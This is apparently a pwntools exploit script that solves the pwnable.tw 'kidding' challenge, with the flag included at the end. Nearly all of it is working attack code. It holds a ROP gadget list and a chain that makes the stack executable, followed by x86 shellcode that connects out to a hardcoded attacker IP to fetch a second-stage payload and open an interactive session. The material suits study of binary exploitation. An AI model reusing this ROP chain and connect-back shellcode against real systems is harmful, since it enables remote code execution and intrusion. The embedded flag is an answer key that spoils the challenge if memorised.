from pwn import *
#https://blog.idiot.sg/2018-09-03/tokyowesterns-ctf-2018-load-pwn/
#https://www.hy-star.com.tw/tech/linux/fd/fd.html
'''
first try to reopen(/dev/pts) but remote connect will replace /dev/pts to some pipe, so this method fail
/proc/self/fd/0 is a soft link to /dev/pts/number in local process
'''


'''
$eax   : 0x0
$ebx   : 0x80481a8  →  <_init+0> push ebx
$ecx   : 0xffffd0c0  →  0x0a333231 ("123\n"?)
$edx   : 0x80481a8  →  <_init+0> push ebx
$esp   : 0xffffd0cc  →  0x8048ae1  →  <generic_start_main+545> add esp, 0x10
$ebp   : 0x1000
$esi   : 0x80ea00c  →  0x8066de0  →  <__strcpy_sse2+0> mov edx, DWORD PTR [esp+0x4]
$edi   : 0x9a
$eip   : 0x80488b6
'''

'''
gadget 
0x0806ec8b : pop edx ; ret
0x080b8536 : pop eax ; ret
0x080481c9 : pop ebx ; ret
0x080583c9 : pop ecx ; ret
0x080b84e6 : pop esp ; ret
0x080dbf05 : push ecx ; ret
0x0806c825 : int 0x80
0x080be194 : xchg ecx, eax ; retf
0x080d5a88 : xchg ebx, eax ; retf
0x0805462b : mov dword ptr [edx], eax ; ret
0x080c99b0 : call esp
'''
#r = remote('0.0.0.0',23946)
r = remote('chall.pwnable.tw',10303)
#r = process(['strace' , './kidding'])
#r = process('./kidding')
pop_eax = 0x080b8536
pop_ebx = 0x080481c9
pop_ecx = 0x080583c9
pop_edx = 0x0806ec8b
call_esp =0x080c99b0
mov_dword_edx_eax = 0x0805462b

dl_make_stack_executable = 0x0809A080
libc_stack_end = 0x80e9fc8
stack_proc = 0x80e9fec

### call dl_make_stack_executable
payload = p32(0) * 3
payload += p32(pop_eax) + p32(7) + p32(pop_edx) + p32(stack_proc) + p32(mov_dword_edx_eax)
payload += p32(pop_eax) + p32(libc_stack_end)
payload += p32(dl_make_stack_executable) + p32(call_esp) 

### shell code 52 byte left
ip = 0x72e9708c
#ip=0x0101017f

## ref1 : https://cocomelonc.github.io/tutorial/2021/10/17/linux-shellcoding-2.html
## ref2 : https://ptr-yudai.hatenablog.com/entry/2020/12/09/200118#pwn-420pts-Blacklist-4-solves

### create socket to our ip to sent 2 stage shellcode
shell_code = asm(f'''
    
    push 0x66
    pop eax
    push 0x1 
    pop ebx
    xor edx, edx 

    push edx
    push ebx
    push 0x2
    mov  ecx, esp
    int  0x80

    mov  al, 0x66

    push {ip}
    pushw  0x5c11
    inc ebx
    pushw bx
    mov  ecx, esp 

    push 0x10
    push ecx
    push edx
    mov ecx, esp
    inc ebx
    int 0x80

    push ebx
    pop eax
    xor ebx, ebx
    push edi
    pop edx
    int 0x80
    call esp

''')

print(len(shell_code))
r.send(payload + shell_code) 
r.interactive()

### FLAG{Ar3_y0u_k1dd1ng_m3}